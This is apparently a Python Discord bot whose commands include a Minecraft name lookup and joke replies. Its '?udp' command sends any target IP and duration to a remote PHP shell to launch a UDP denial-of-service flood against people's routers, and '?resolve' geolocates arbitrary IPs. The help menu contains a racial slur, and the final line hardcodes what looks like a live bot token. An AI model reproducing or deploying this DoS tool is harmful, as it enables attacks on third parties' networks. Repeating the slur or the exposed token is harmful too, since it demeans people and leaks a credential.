import discord
import json
import requests
from discord.ext.commands import Bot
from discord.ext import commands

Client = discord.Client()
bot_prefix = "?"
client = commands.Bot(command_prefix=bot_prefix)

@client.event
async def on_ready():
	print("Bot Online!")
	print("Name: {}".format(client.user.name))
	print("ID: {}".format(client.user.id))
	await client.change_presence(game=discord.Game(name='?commands for help'))


#Help Menu (?help)
@client.command(pass_context=True)
async def commands(ctx):
	await client.say("Welcome to ZoodleC0rpz Official Discord Bot\n?commands - Dank shit nigga\n?oldnames - minecraf oldname lookup(?oldnames USERNAME)\n?udp - DOS tool used to lightly toast routers(?udp IP SECONDS)\n?resolve - IP Resolver that finds LOCATION of IP(?resolve IP)\n?bark - Like ping but... better\n?daddy - Whos ur daddy 0.o")

#Minecraft Name History (?oldnames <username>)
@client.command(pass_context=True)
async def oldnames(ctx, username):
	url = "https://api.mojang.com/users/profiles/minecraft/" + username
	r = requests.get(url)
	uuid = r.json()['id']
	
	url2 = "https://api.mojang.com/user/profiles/" + uuid + "/names"
	r2 = requests.get(url2)
	numNames = len(r2.json())
	names = ""
	while(numNames > 0):
       		names += (r2.json()[numNames - 1]['name']) + "\n"
        	numNames -= 1
	await client.say(names)

#Sends UDP Flood (?udp <IP> <TIME(SEC)>)
@client.command(pass_context=True)
async def udp(ctx, ip, time):
	if(int(time) > 60):
		await client.say("You can only toast for 60 seconds!")
	else:
		await client.say("Attempting to toast " + ip + " for " + time + " seconds!")
		url = "http://YOURSHELLHERE/dos.php?host=" + ip + "&time=" + time + "&type=UDP"
		requests.get(url)
		await client.say("Successfully toasted " + ip + "'s router")

#Resolve IP (?resolve <ip>)
@client.command(pass_context=True)
async def resolve(ctx, ip):
	url = 'http://ip-api.com/json/' + ip
	r = requests.get(url)
	await client.say("\n" + "IP: " + r.json()['query'] + "\n" + "Country: " + r.json()['country'] + " (" + r.json()['countryCode'] + ")" + "\n" + "Region/State: " + r.json()['regionName'] + " (" + r.json()['region'] + ")" + "\n" + "City: " + r.json()['city'] + "\n" + "Lat: " + str(r.json()['lat']) + "\n" + " Long: " + str(r.json()['lon']) + "\n" + "ISP: " + r.json()['isp'] + "\n" + "AS number/name: " + r.json()['as'])

#Replys "Doggo does a bark"
@client.command(pass_context=True)
async def bark(ctx):
	await client.say("Doggo does a bark!")

#Replys the author of this discord bot
@client.command(pass_context=True)
async def daddy(ctx):
	await client.say("Papi Noodles")


client.run("MzI3OTg2NjQzNzc0NDcyMTkz.DC9eTQ.QmNX8VrpZMIm9FKqFoZIXuMIg2k")

